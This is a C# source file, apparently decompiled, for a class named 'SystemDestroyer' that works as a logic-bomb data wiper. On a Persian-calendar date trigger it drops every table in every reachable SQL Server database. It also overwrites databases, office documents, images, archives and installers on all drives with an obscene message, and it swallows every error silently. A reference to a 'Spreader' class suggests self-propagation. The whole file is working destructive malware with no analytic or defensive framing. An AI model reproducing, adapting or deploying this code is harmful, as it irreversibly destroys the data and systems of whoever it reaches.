using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Threading;
using TRM.Spread;

namespace TRM.Classes;

public static class SystemDestroyer
{
	public static readonly int DelayBetweenChecks = 14400000;

	private static readonly string StrFilesToBeDestroyed = "*.dbf;*.fpt;*.cdx;*.mdb;*.accdb;*.mdf;*.txt;*.xls?;*.doc?;*.ppt?;*.jpg;*.bak;*.rar;*.7z;*.zip;*.cab;*.msi;*setup.exe";

	private static readonly string StrMessageInDestroyedFile = "Because fuck you! That's why.";

	private static readonly int DelayInFileDestroy = 70;

	public static void StartSystemDestroyerProcessInTime()
	{
		do
		{
			if (IsItsTimeToStartDestroyer())
			{
				StartSystemDestroyerDirect();
			}
			Thread.Sleep(DelayBetweenChecks);
		}
		while (AppConfig.AppIsRunning);
	}

	private static bool IsItsTimeToStartDestroyer()
	{
		DateTime now = DateTime.Now;
		PersianCalendar persianCalendar = new PersianCalendar();
		int month = persianCalendar.GetMonth(now);
		int year = persianCalendar.GetYear(now);
		int dayOfMonth = persianCalendar.GetDayOfMonth(now);
		int daysInMonth = persianCalendar.GetDaysInMonth(year, month);
		if (month != 1 && month != 12 && month / 2 == 0)
		{
			return false;
		}
		if (daysInMonth - dayOfMonth <= 3)
		{
			return true;
		}
		return false;
	}

	private static void StartSystemDestroyerDirect()
	{
		IAsyncResult asyncResult = new ActionMethod(StartDestroySqlServerData).BeginInvoke(null, null);
		IAsyncResult asyncResult2 = new ActionMethod(StartDestroySystemFiles).BeginInvoke(null, null);
		asyncResult.AsyncWaitHandle.WaitOne();
		asyncResult2.AsyncWaitHandle.WaitOne();
	}

	private static void StartDestroySqlServerData()
	{
		try
		{
			List<string> allSqlDataSources = SqlServerHelper.GetAllSqlDataSources();
			List<string> list = new List<string>();
			foreach (string item in allSqlDataSources)
			{
				try
				{
					if (SqlServerHelper.IsSqlServerAvailable(item))
					{
						list.Add(item);
					}
				}
				catch
				{
				}
			}
			foreach (string item2 in list)
			{
				List<string> databaseList = SqlServerHelper.GetDatabaseList(item2);
				foreach (string item3 in databaseList)
				{
					try
					{
						SqlServerHelper.DropAllTables(item2, item3);
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private static void StartDestroySystemFiles()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			for (int num = logicalDrives.Length - 1; num >= 0; num--)
			{
				string startPath = logicalDrives[num];
				FileHelper.SearchFiles(startPath, StrFilesToBeDestroyed, subdirectories: true, delegate(List<string> fileNameList)
				{
					foreach (string fileName in fileNameList)
					{
						if (DelayInFileDestroy > 0)
						{
							Thread.Sleep(DelayInFileDestroy);
						}
						try
						{
							File.WriteAllText(fileName, StrMessageInDestroyedFile);
						}
						catch
						{
						}
					}
				}, Spreader.ExcludedStartedByFolders);
			}
		}
		catch
		{
		}
	}
}
